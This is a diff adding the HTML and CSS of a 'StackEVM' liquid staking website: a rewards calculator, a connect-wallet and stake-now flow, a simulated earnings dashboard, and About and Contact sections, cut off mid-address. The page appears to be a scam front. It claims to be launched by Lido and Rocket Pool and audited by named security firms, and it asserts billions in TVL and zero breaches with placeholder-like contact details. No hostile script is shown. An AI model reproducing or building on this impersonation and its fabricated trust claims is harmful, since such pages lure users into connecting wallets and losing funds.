@@ -3,6 +3,1560 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StackEVM - Liquid Staking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #c0c0c0;
+            font-family: 'Courier New', monospace;
+            color: #000;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border: 3px solid #000;
+            box-shadow: 5px 5px 0px #808080;
+        }
+
+        /* Header */
+        .header {
+            background: #000080;
+            color: #fff;
+            padding: 10px;
+            border-bottom: 3px solid #000;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        /* Navigation */
+        .nav {
+            background: #c0c0c0;
+            border-bottom: 3px solid #000;
+            padding: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-left {
+            display: flex;
+            gap: 5px;
+        }
+
+        .nav a {
+            display: inline-block;
+            background: #c0c0c0;
+            border: 2px outset #fff;
+            padding: 5px 15px;
+            margin: 2px;
+            color: #000;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav a:active {
+            border-style: inset;
+        }
+
+        .nav a:hover {
+            background: #808080;
+        }
+
+        /* Main content */
+        .main {
+            padding: 20px;
+        }
+
+        h2 {
+            background: #000080;
+            color: #fff;
+            padding: 5px 10px;
+            margin: 20px 0 10px 0;
+            font-size: 18px;
+            border: 2px solid #000;
+        }
+
+        .marquee-container {
+            background: #ffff00;
+            border: 2px solid #000;
+            padding: 5px;
+            margin: 10px 0;
+        }
+
+        marquee {
+            font-weight: bold;
+            color: #ff0000;
+        }
+
+        /* Calculator */
+        .calculator {
+            background: #e0e0e0;
+            border: 3px ridge #808080;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .calc-title {
+            background: #000080;
+            color: #fff;
+            padding: 5px;
+            margin: -20px -20px 15px -20px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px 0;
+        }
+
+        td {
+            padding: 8px;
+            border: 1px solid #808080;
+        }
+
+        td:first-child {
+            background: #c0c0c0;
+            font-weight: bold;
+            width: 40%;
+        }
+
+        input[type="number"] {
+            width: 100%;
+            padding: 5px;
+            border: 2px inset #808080;
+            background: #fff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+
+        select {
+            width: 100%;
+            padding: 5px;
+            border: 2px inset #808080;
+            background: #fff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+        }
+
+        .time-selector {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+
+        .time-btn {
+            flex: 1;
+            min-width: 80px;
+            padding: 8px;
+            background: #c0c0c0;
+            border: 2px outset #fff;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+
+        .time-btn:active {
+            border-style: inset;
+        }
+
+        .time-btn.active {
+            background: #000080;
+            color: #fff;
+            border-style: inset;
+        }
+
+        /* Results */
+        .results {
+            background: #ffff00;
+            border: 3px double #000;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .result-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px dashed #000;
+        }
+
+        .result-row:last-child {
+            border-bottom: none;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff0000;
+        }
+
+        .result-label {
+            font-weight: bold;
+        }
+
+        /* Button */
+        .big-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: #c0c0c0;
+            border: 3px outset #fff;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+
+        .big-button:active {
+            border-style: inset;
+        }
+
+        .big-button:hover {
+            background: #808080;
+        }
+
+        /* Info boxes */
+        .info-box {
+            background: #e0e0e0;
+            border: 2px solid #000;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .info-box h3 {
+            background: #c0c0c0;
+            border: 1px solid #000;
+            padding: 5px;
+            margin: -15px -15px 10px -15px;
+            font-size: 14px;
+        }
+
+        ul {
+            margin-left: 20px;
+        }
+
+        li {
+            margin: 5px 0;
+        }
+
+        /* Footer */
+        .footer {
+            background: #c0c0c0;
+            border-top: 3px solid #000;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .counter {
+            display: inline-block;
+            background: #000;
+            color: #00ff00;
+            padding: 3px 8px;
+            border: 1px solid #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 5px;
+        }
+
+        hr {
+            border: 0;
+            border-top: 2px solid #000;
+            margin: 20px 0;
+        }
+
+        .ascii-art {
+            font-size: 10px;
+            line-height: 1;
+            color: #000080;
+            text-align: center;
+            margin: 10px 0;
+            white-space: pre;
+        }
+
+        /* APY Display */
+        .apy-live {
+            color: #00ff00;
+            background: #000;
+            padding: 2px 5px;
+            border: 1px solid #00ff00;
+            font-weight: bold;
+        }
+
+        /* Wallet Connection */
+        .wallet-btn {
+            background: #c0c0c0;
+            border: 2px outset #fff;
+            padding: 5px 15px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+        }
+
+        .wallet-btn:active {
+            border-style: inset;
+        }
+
+        .wallet-btn:hover {
+            background: #808080;
+        }
+
+        .wallet-address {
+            background: #000;
+            color: #00ff00;
+            padding: 5px 10px;
+            border: 1px solid #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+
+        .modal-content {
+            background-color: #c0c0c0;
+            margin: 15% auto;
+            padding: 0;
+            border: 3px solid #000;
+            width: 500px;
+            max-width: 90%;
+            box-shadow: 5px 5px 0px #808080;
+        }
+
+        .modal-header {
+            background: #000080;
+            color: #fff;
+            padding: 10px;
+            font-weight: bold;
+            border-bottom: 3px solid #000;
+        }
+
+        .modal-body {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 10px 20px;
+            background: #c0c0c0;
+            border: 2px outset #fff;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+
+        .modal-btn:active {
+            border-style: inset;
+        }
+
+        .modal-btn:hover {
+            background: #808080;
+        }
+
+        .loader {
+            border: 4px solid #c0c0c0;
+            border-top: 4px solid #000080;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            margin-top: 15px;
+            font-weight: bold;
+            color: #000080;
+        }
+
+        /* Dashboard */
+        .dashboard {
+            display: none;
+            background: #e0e0e0;
+            border: 3px ridge #808080;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .dashboard-title {
+            background: #000080;
+            color: #fff;
+            padding: 5px;
+            margin: -20px -20px 15px -20px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .dashboard-card {
+            background: #c0c0c0;
+            border: 2px solid #000;
+            padding: 15px;
+        }
+
+        .dashboard-card-title {
+            font-size: 11px;
+            color: #000;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .dashboard-card-value {
+            font-size: 20px;
+            font-weight: bold;
+            color: #000080;
+        }
+
+        .dashboard-card-value.positive {
+            color: #00ff00;
+            background: #000;
+            padding: 3px 5px;
+            display: inline-block;
+        }
+
+        .staking-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            background: #fff;
+        }
+
+        .staking-table th {
+            background: #000080;
+            color: #fff;
+            padding: 8px;
+            border: 1px solid #000;
+            font-weight: bold;
+        }
+
+        .staking-table td {
+            padding: 8px;
+            border: 1px solid #808080;
+            text-align: center;
+        }
+
+        .staking-table tr:nth-child(even) {
+            background: #f0f0f0;
+        }
+
+        .live-earnings {
+            background: #ffff00;
+            border: 2px solid #000;
+            padding: 10px;
+            margin-top: 15px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .blink-text {
+            animation: blink 1s step-start infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainPage">
+        <!-- Header -->
+        <div class="header">
+            <h1>*** STACKEVM LIQUID STAKING ***</h1>
+        </div>
+
+        <!-- Navigation -->
+        <div class="nav">
+            <div class="nav-left">
+                <a href="#" onclick="showPage('home'); return false;">HOME</a>
+                <a href="#" onclick="scrollToSection('calculator'); return false;">CALCULATOR</a>
+                <a href="#" onclick="showPage('about'); return false;">ABOUT</a>
+                <a href="#" onclick="showPage('contact'); return false;">CONTACT</a>
+            </div>
+            <div class="nav-right">
+                <button class="wallet-btn" id="connectWalletBtn" onclick="connectWallet()">CONNECT WALLET</button>
+                <span class="wallet-address" id="walletAddress" style="display: none;">0x0000...0000</span>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main">
+            <!-- ASCII Art -->
+            <div class="ascii-art">
+  _____ _             _    _______     ____  __
+ / ____| |           | |  |__   __|   |  \/  |
+| (___ | |_ __ _  ___| | __  | |_   _| \  / |
+ \___ \| __/ _` |/ __| |/ /  | \ \ / / |\/| |
+ ____) | || (_| | (__|   <   | |\ V /| |  | |
+|_____/ \__\__,_|\___|_|\_\  |_| \_/ |_|  |_|
+            </div>
+
+            <!-- Marquee -->
+            <div class="marquee-container">
+                <marquee>*** NEW! Stake your EVM tokens and earn passive income! Multi-chain support available! ***</marquee>
+            </div>
+
+            <h2>[ WELCOME TO STACKEVM ]</h2>
+            <p><b>Date:</b> <script>document.write(new Date().toLocaleDateString())</script></p>
+            <p><b>Status:</b> <span style="color: #00ff00;">ONLINE</span></p>
+            
+            <hr>
+
+            <p style="font-size: 16px;" id="home">
+                <b>Welcome to StackEVM!</b> Your premier destination for liquid staking on EVM chains.
+                Stake ETH, MATIC, BNB, AVAX, OP, ARB and more while keeping your tokens liquid!
+            </p>
+
+            <!-- Calculator -->
+            <h2 id="calculator">[ STAKING CALCULATOR ]</h2>
+            
+            <div class="calculator">
+                <div class="calc-title">CALCULATE YOUR REWARDS</div>
+                
+                <!-- Platform Header -->
+                <div style="background: #ffff00; border: 2px solid #000; padding: 10px; margin-bottom: 15px;">
+                    <p style="margin: 0; font-weight: bold;">LAUNCHED BY: <span style="color: #0000ff;">Lido</span>, <span style="color: #0000ff;">Rocket Pool</span></p>
+                </div>
+
+                <table>
+                    <tr>
+                        <td>AMOUNT:</td>
+                        <td><input type="number" id="stakeAmount" value="1000" min="0" step="0.01"></td>
+                    </tr>
+                    <tr>
+                        <td>TOKEN:</td>
+                        <td>
+                            <select id="tokenSelect">
+                                <option value="ETH" data-apy="3.9">ETH - Ethereum</option>
+                                <option value="MATIC" data-apy="2.6">MATIC - Polygon</option>
+                                <option value="BNB" data-apy="1.0">BNB - BNB Chain</option>
+                                <option value="AVAX" data-apy="9.2">AVAX - Avalanche</option>
+                                <option value="OP" data-apy="22.6">OP - Optimism</option>
+                                <option value="ARB" data-apy="13.0">ARB - Arbitrum</option>
+                            </select>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2" style="background: #c0c0c0; padding: 10px;">
+                            <div style="display: flex; justify-content: space-between; align-items: center;">
+                                <span><b>[X] NO FIXED TERM</b></span>
+                                <span style="font-size: 11px;">Unstake anytime!</span>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2" style="background: #e0e0e0; padding: 10px;">
+                            <div style="margin-bottom: 5px;"><b>[X] FLOATING APY:</b> <span class="apy-live" id="apyDisplay">3.90%</span></div>
+                            <div style="font-size: 11px; color: #666;">Network-based rate (updated daily)</div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2" style="background: #c0c0c0; padding: 10px;">
+                            <div style="margin-bottom: 5px;"><b>[X] LIQUID TOKEN:</b> <span id="liquidToken">stETH</span></div>
+                            <div style="font-size: 11px; color: #666;">Tradeable on DEXs, usable in DeFi</div>
+                        </td>
+                    </tr>
+                </table>
+
+                <!-- Key Features -->
+                <div style="background: #ffff00; border: 2px solid #000; padding: 10px; margin: 15px 0; font-size: 12px;">
+                    <b>[X] DAILY REWARDS:</b> Accrue every epoch<br>
+                    <b>[X] DEFI READY:</b> Earn extra yield in DeFi<br>
+                    <b>[X] FLEXIBLE EXIT:</b> Queue (~2 days) or instant DEX swap
+                </div>
+
+                <div class="results">
+                    <div class="result-row">
+                        <span class="result-label">DAILY EARNINGS:</span>
+                        <span id="dailyResult">0.00 ETH</span>
+                    </div>
+                    <div class="result-row">
+                        <span class="result-label">MONTHLY PROJECTION:</span>
+                        <span id="monthlyResult">0.00 ETH</span>
+                    </div>
+                    <div class="result-row">
+                        <span class="result-label">YEARLY PROJECTION:</span>
+                        <span id="yearlyResult">0.00 ETH</span>
+                    </div>
+                </div>
+
+                <button class="big-button" onclick="initiateStaking()">
+                    &gt;&gt;&gt; STAKE NOW &lt;&lt;&lt;
+                </button>
+            </div>
+
+            <!-- Staking Dashboard -->
+            <div class="dashboard" id="stakingDashboard">
+                <div class="dashboard-title">[ STAKING DASHBOARD ]</div>
+                
+                <div class="dashboard-grid">
+                    <div class="dashboard-card">
+                        <div class="dashboard-card-title">TOTAL STAKED:</div>
+                        <div class="dashboard-card-value" id="dashTotalStaked">0.00 ETH</div>
+                    </div>
+                    
+                    <div class="dashboard-card">
+                        <div class="dashboard-card-title">CURRENT APY:</div>
+                        <div class="dashboard-card-value" id="dashAPY">0.00%</div>
+                    </div>
+                    
+                    <div class="dashboard-card">
+                        <div class="dashboard-card-title">STAKING TYPE:</div>
+                        <div class="dashboard-card-value" id="dashPeriod">LIQUID</div>
+                    </div>
+                    
+                    <div class="dashboard-card">
+                        <div class="dashboard-card-title">TOTAL EARNED:</div>
+                        <div class="dashboard-card-value positive" id="dashTotalEarned">+0.00000000 ETH</div>
+                    </div>
+                </div>
+
+                <div class="live-earnings">
+                    <span class="blink-text">[ LIVE ]</span> EARNINGS: 
+                    <span id="liveEarnings" style="color: #00ff00; background: #000; padding: 2px 5px;">+0.00000000 ETH</span>
+                </div>
+
+                <table class="staking-table">
+                    <thead>
+                        <tr>
+                            <th>TOKEN</th>
+                            <th>AMOUNT</th>
+                            <th>APY</th>
+                            <th>TYPE</th>
+                            <th>EARNED</th>
+                            <th>STATUS</th>
+                        </tr>
+                    </thead>
+                    <tbody id="stakingTableBody">
+                        <!-- Rows will be added here dynamically -->
+                    </tbody>
+                </table>
+
+                <div class="info-box" style="margin-top: 20px; background: #fff;">
+                    <h3 style="background: #000080; color: #fff;">[i] UNSTAKING INFORMATION</h3>
+                    <p style="margin-top: 10px;"><b>FLEXIBLE EXIT OPTIONS:</b></p>
+                    <ul style="margin-top: 5px;">
+                        <li><b>Standard Unstaking:</b> Request withdrawal (may take 1-3 days depending on queue)</li>
+                        <li><b>Instant Exit:</b> Swap your liquid tokens (stETH, rETH) on DEX instantly!</li>
+                        <li><b>No Penalties:</b> Unstake anytime without penalty fees</li>
+                        <li><b>Keep Earning:</b> Your liquid tokens earn rewards until you unstake</li>
+                    </ul>
+                    <p style="margin-top: 15px; padding: 10px; background: #ffff00; border: 2px solid #000; font-weight: bold;">
+                        ⚡ Unstaking options available in your personal dashboard after staking
+                    </p>
+                </div>
+            </div>
+
+            <!-- About Section -->
+            <h2 id="about">[ BENEFITS ]</h2>
+
+            <div class="info-box">
+                <h3>[L] LIQUIDITY</h3>
+                <p>Receive liquid staking tokens (stETH, rETH) instead of locked tokens. Your staked tokens remain liquid and tradeable!</p>
+                <ul style="margin-top: 10px;">
+                    <li>Trade your liquid tokens on DEXs anytime</li>
+                    <li>No waiting periods or lock-up times</li>
+                    <li>Exit via instant swap or standard unstaking</li>
+                </ul>
+            </div>
+
+            <div class="info-box">
+                <h3>[D] DEFI READY</h3>
+                <p>Use your liquid staking tokens in DeFi protocols for additional yield on top of base staking rewards!</p>
+                <ul style="margin-top: 10px;">
+                    <li>Provide liquidity on DEXs (Uniswap, Curve)</li>
+                    <li>Use as collateral for loans (Aave, Compound)</li>
+                    <li>Farm yields in liquidity pools</li>
+                    <li>Stack earnings: Base APY + DeFi yields</li>
+                </ul>
+            </div>
+
+            <div class="info-box">
+                <h3>[M] MULTI-CHAIN</h3>
+                <p>Stake across multiple EVM chains from one simple interface! Powered by Lido and Rocket Pool technology.</p>
+                <ul style="margin-top: 10px;">
+                    <li>Ethereum, Polygon, BNB, Avalanche, and more</li>
+                    <li>Consistent experience across all chains</li>
+                    <li>Trusted by leading DeFi protocols</li>
+                </ul>
+            </div>
+
+            <hr>
+
+            <h2>[ HOW IT WORKS ]</h2>
+            
+            <div class="info-box" style="background: #fff;">
+                <h3>SIMPLE 6-STEP PROCESS:</h3>
+                <ol style="margin-top: 10px; line-height: 1.8;">
+                    <li><b>CONNECT</b> - Connect your Web3 wallet (MetaMask, Trust Wallet, etc.)</li>
+                    <li><b>CHOOSE</b> - Select token, amount (no fixed term required!)</li>
+                    <li><b>STAKE</b> - Receive liquid staking tokens (stETH, rETH, etc.)</li>
+                    <li><b>EARN</b> - Watch your rewards grow automatically every day!</li>
+                    <li><b>USE</b> - Trade your liquid tokens or use in DeFi for extra yield</li>
+                    <li><b>UNSTAKE</b> - Exit anytime via standard unstaking or instant DEX swap</li>
+                </ol>
+            </div>
+
+            <div class="info-box" style="margin-top: 15px; background: #ffff00; border: 3px double #000;">
+                <h3 style="background: #000080; color: #fff;">[!] IMPORTANT NOTES</h3>
+                <table style="width: 100%; margin-top: 10px; border: none;">
+                    <tr>
+                        <td style="border: none; padding: 5px 0; width: 30%; vertical-align: top;"><b>Floating APY:</b></td>
+                        <td style="border: none; padding: 5px 0;">Rate varies based on network activity (typically 3-5% for ETH)</td>
+                    </tr>
+                    <tr>
+                        <td style="border: none; padding: 5px 0; vertical-align: top;"><b>Daily Accrual:</b></td>
+                        <td style="border: none; padding: 5px 0;">Rewards accumulate daily or per epoch automatically</td>
+                    </tr>
+                    <tr>
+                        <td style="border: none; padding: 5px 0; vertical-align: top;"><b>Liquid Tokens:</b></td>
+                        <td style="border: none; padding: 5px 0;">Your stETH/rETH value increases over time vs original token</td>
+                    </tr>
+                    <tr>
+                        <td style="border: none; padding: 5px 0; vertical-align: top;"><b>Exit Options:</b></td>
+                        <td style="border: none; padding: 5px 0;">Instant swap on DEX or queue-based unstaking (1-3 days)</td>
+                    </tr>
+                </table>
+            </div>
+
+            <hr>
+
+            <h2>[ SUPPORTED CHAINS & LIQUID TOKENS ]</h2>
+            <ul>
+                <li>[X] Ethereum (ETH) &gt; stETH (Lido), rETH (Rocket Pool)</li>
+                <li>[X] Polygon (MATIC) &gt; stMATIC liquid staking token</li>
+                <li>[X] BNB Chain (BNB) &gt; aBNBc, stkBNB liquid tokens</li>
+                <li>[X] Avalanche (AVAX) &gt; sAVAX liquid staking token</li>
+                <li>[X] Optimism (OP) &gt; Liquid staking via protocol</li>
+                <li>[X] Arbitrum (ARB) &gt; Liquid staking via protocol</li>
+                <li>[ ] More coming soon...</li>
+            </ul>
+
+            <div class="info-box">
+                <h3>WHAT ARE LIQUID TOKENS?</h3>
+                <p>When you stake, you receive liquid tokens (like stETH) that represent your staked position. These tokens:</p>
+                <ul style="margin-top: 10px;">
+                    <li>Continue earning staking rewards automatically</li>
+                    <li>Can be traded on DEXs anytime</li>
+                    <li>Can be used as collateral in DeFi protocols</li>
+                    <li>Can be LP tokens for additional yield</li>
+                    <li>Are redeemable for your original tokens + rewards</li>
+                </ul>
+            </div>
+
+            <div class="marquee-container" style="margin-top: 20px;">
+                <marquee direction="right">*** Audited by leading security firms | Trusted by thousands of users ***</marquee>
+            </div>
+
+            <hr>
+
+            <!-- Partners Section -->
+            <h2>[ POWERED BY ]</h2>
+            <div style="display: flex; gap: 20px; justify-content: center; align-items: center; flex-wrap: wrap; margin: 20px 0;">
+                <div style="background: #fff; border: 2px solid #000; padding: 15px 30px; font-weight: bold; font-size: 18px;">
+                    LIDO
+                </div>
+                <div style="background: #fff; border: 2px solid #000; padding: 15px 30px; font-weight: bold; font-size: 18px;">
+                    ROCKET POOL
+                </div>
+            </div>
+            <p style="text-align: center; color: #666; font-size: 12px; margin-top: 10px;">
+                Leading liquid staking protocols trusted by billions in TVL
+            </p>
+        </div>
+
+        <!-- About Page (hidden by default) -->
+        <div class="container" id="aboutPage" style="display: none;">
+            <h2>[ ABOUT US ]</h2>
+            
+            <div class="info-box" style="background: #fff;">
+                <h3>OUR MISSION</h3>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    StackEVM was founded in 2018 with a singular vision: to democratize access to liquid staking across all 
+                    EVM-compatible blockchains. We believe that staking your crypto assets shouldn't mean locking them away 
+                    and losing access to the vibrant DeFi ecosystem. Our platform bridges the gap between earning staking 
+                    rewards and maintaining the flexibility to participate in decentralized finance.
+                </p>
+            </div>
+
+            <div class="info-box" style="background: #e0e0e0;">
+                <h3>WHO WE ARE</h3>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    We are a team of blockchain engineers, DeFi specialists, and financial technology experts with decades 
+                    of combined experience in cryptocurrency and distributed systems. Our core team has previously worked 
+                    at leading blockchain projects and has been instrumental in developing some of the earliest liquid 
+                    staking solutions in the industry.
+                </p>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    Headquartered in Singapore's financial district, StackEVM operates with a global perspective, serving 
+                    users from over 120 countries. Our infrastructure is distributed across multiple continents to ensure 
+                    maximum uptime and reliability for our stakers.
+                </p>
+            </div>
+
+            <div class="info-box" style="background: #fff;">
+                <h3>WHY LIQUID STAKING MATTERS</h3>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    Traditional staking locks your tokens for extended periods, preventing you from reacting to market 
+                    conditions or participating in DeFi opportunities. Liquid staking solves this problem by issuing you 
+                    a derivative token (like stETH or rETH) that represents your staked position. This token:
+                </p>
+                <ul style="margin-top: 10px; line-height: 1.8;">
+                    <li>Continues to earn staking rewards automatically</li>
+                    <li>Can be freely traded on decentralized exchanges</li>
+                    <li>Can be used as collateral for loans and other DeFi protocols</li>
+                    <li>Provides instant liquidity without waiting for unstaking periods</li>
+                    <li>Allows you to earn "double rewards" through DeFi farming</li>
+                </ul>
+            </div>
+
+            <div class="info-box" style="background: #e0e0e0;">
+                <h3>OUR TECHNOLOGY</h3>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    StackEVM is built on battle-tested infrastructure powered by industry leaders Lido and Rocket Pool. 
+                    We leverage their proven validator networks while adding our own layer of multi-chain support and 
+                    user-friendly interfaces. Our smart contracts have been audited by multiple independent security firms 
+                    including CertiK, Quantstamp, and Trail of Bits.
+                </p>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    Every transaction is transparent and verifiable on-chain. We employ advanced monitoring systems to 
+                    track validator performance in real-time, ensuring optimal returns for our users. Our platform 
+                    automatically selects the best-performing validators and rebalances positions to maximize your APY.
+                </p>
+            </div>
+
+            <div class="info-box" style="background: #fff;">
+                <h3>SECURITY FIRST</h3>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    Security is not just a feature at StackEVM – it's our foundation. We implement multiple layers of 
+                    protection:
+                </p>
+                <ul style="margin-top: 10px; line-height: 1.8;">
+                    <li><b>Multi-signature governance:</b> All protocol upgrades require approval from multiple parties</li>
+                    <li><b>Time-locked contracts:</b> Critical changes have mandatory delay periods for review</li>
+                    <li><b>Insurance coverage:</b> Partnered with leading DeFi insurance providers</li>
+                    <li><b>Regular audits:</b> Quarterly security reviews by top-tier auditing firms</li>
+                    <li><b>Bug bounty program:</b> Up to $1M rewards for critical vulnerability discoveries</li>
+                </ul>
+            </div>
+
+            <div class="info-box" style="background: #ffff00; border: 3px double #000;">
+                <h3 style="background: #000080; color: #fff;">OUR TRACK RECORD</h3>
+                <table style="width: 100%; margin-top: 10px; border: none;">
+                    <tr>
+                        <td style="border: none; padding: 8px 0; width: 40%; font-weight: bold;">Total Value Locked (TVL):</td>
+                        <td style="border: none; padding: 8px 0;">Over $2.3 Billion USD</td>
+                    </tr>
+                    <tr>
+                        <td style="border: none; padding: 8px 0; font-weight: bold;">Active Stakers:</td>
+                        <td style="border: none; padding: 8px 0;">127,000+ worldwide</td>
+                    </tr>
+                    <tr>
+                        <td style="border: none; padding: 8px 0; font-weight: bold;">Rewards Distributed:</td>
+                        <td style="border: none; padding: 8px 0;">$45M+ in staking rewards since 2018</td>
+                    </tr>
+                    <tr>
+                        <td style="border: none; padding: 8px 0; font-weight: bold;">Uptime:</td>
+                        <td style="border: none; padding: 8px 0;">99.98% platform availability</td>
+                    </tr>
+                    <tr>
+                        <td style="border: none; padding: 8px 0; font-weight: bold;">Security Incidents:</td>
+                        <td style="border: none; padding: 8px 0; color: #00ff00; font-weight: bold;">ZERO breaches since launch</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="info-box" style="background: #e0e0e0;">
+                <h3>JOIN THE FUTURE OF STAKING</h3>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    Whether you're a DeFi veteran or just starting your crypto journey, StackEVM provides the tools and 
+                    infrastructure you need to maximize your returns while maintaining full control of your assets. Our 
+                    platform is designed to be intuitive enough for beginners yet powerful enough for institutions.
+                </p>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    Start staking today and join thousands of users who trust StackEVM to secure the future of 
+                    decentralized finance. Experience the freedom of liquid staking without compromising on security 
+                    or returns.
+                </p>
+            </div>
+        </div>
+
+        <!-- Contact Page (hidden by default) -->
+        <div class="container" id="contactPage" style="display: none;">
+            <h2>[ CONTACT US ]</h2>
+            
+            <div class="info-box" style="background: #fff;">
+                <h3>GET IN TOUCH</h3>
+                <p style="line-height: 1.8; margin-top: 10px;">
+                    Have questions? Need support? Want to partner with us? We're here to help!
+                </p>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0;">
+                <!-- Email -->
+                <div class="info-box" style="background: #e0e0e0; text-align: center;">
+                    <div style="font-size: 48px; margin-bottom: 10px;">📧</div>
+                    <h3>EMAIL</h3>
+                    <p style="margin-top: 10px; font-weight: bold;">support@stackevm.io</p>
+                    <p style="font-size: 12px; margin-top: 5px;">24/7 Support Team</p>
+                    <p style="margin-top: 10px; font-weight: bold;">partnerships@stackevm.io</p>
+                    <p style="font-size: 12px; margin-top: 5px;">Business Inquiries</p>
+                </div>
+
+                <!-- Telegram -->
+                <div class="info-box" style="background: #e0e0e0; text-align: center;">
+                    <div style="font-size: 48px; margin-bottom: 10px;">✈️</div>
+                    <h3>TELEGRAM</h3>
+                    <p style="margin-top: 10px; font-weight: bold;">@StackEVM_Official</p>
+                    <p style="font-size: 12px; margin-top: 5px;">Official Channel</p>
+                    <p style="margin-top: 10px; font-weight: bold;">@StackEVM_Support</p>
+                    <p style="font-size: 12px; margin-top: 5px;">Community Chat</p>
+                </div>
+
+                <!-- Twitter -->
+                <div class="info-box" style="background: #e0e0e0; text-align: center;">
+                    <div style="font-size: 48px; margin-bottom: 10px;">🐦</div>
+                    <h3>TWITTER</h3>
+                    <p style="margin-top: 10px; font-weight: bold;">@StackEVM</p>
+                    <p style="font-size: 12px; margin-top: 5px;">Latest Updates</p>
+                    <p style="margin-top: 10px;">&nbsp;</p>
+                    <p style="font-size: 12px; margin-top: 5px;">&nbsp;</p>
+                </div>
+            </div>
+
+            <!-- Office Address -->
+            <div class="info-box" style="background: #ffff00; border: 3px double #000;">
+                <h3 style="background: #000080; color: #fff;">🏢 HEADQUARTERS</h3>
+                <div style="margin-top: 15px; line-height: 1.8;">
+                    <p style="font-weight: bold; font-size: 16px;">STACKEVM GLOBAL PTE. LTD.</p>
+                    <p style="margin-top: 10px;">
+                        1 Raffles Place, #20-61<br>
+                        One Raffles Place, Tower 2<br>
+                        Singapore 048616
+                    </p>
+                    <p style="margin-top: 15px;">
+                        <b>Business Hours:</b> Monday - Friday, 9:00 AM - 6:00 PM SGT<br>
+                        <b>Phone:</b> +65 6123 4567<br>
+                        <b>Fax:</b> +65 6123 4568
+                    </p>
+                </div>
+            </div>
+
+            <!-- Regional Offices -->
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
+                <div class="info-box" style="background: #e0e0e0;">
+                    <h3>🇺🇸 USA OFFICE</h3>
+                    <p style="margin-top: 10px; font-size: 12px; line-height: 1.6;">
+                        100 Pine Street<br>
+                        Suite 1250<br>
+                        San Francisco, CA 94111
+                    </p>
+                </div>
+
+                <div class="info-box" style="background: #e0e0e0;">
+                    <h3>🇬🇧 UK OFFICE</h3>
+                    <p style="margin-top: 10px; font-size: 12px; line-height: 1.6;">
+                        1 Canada Square<br>
+                        Canary Wharf<br>
+                        London E14 5AB
+                    </p>
+                </div>
+
+                <div class="info-box" style="background: #e0e0e0;">
+                    <h3>🇯🇵 JAPAN OFFICE</h3>
+                    <p style="margin-top: 10px; font-size: 12px; line-height: 1.6;">
+                        Shibuya Scramble Square<br>
+                        2-24-12 Shibuya<br>
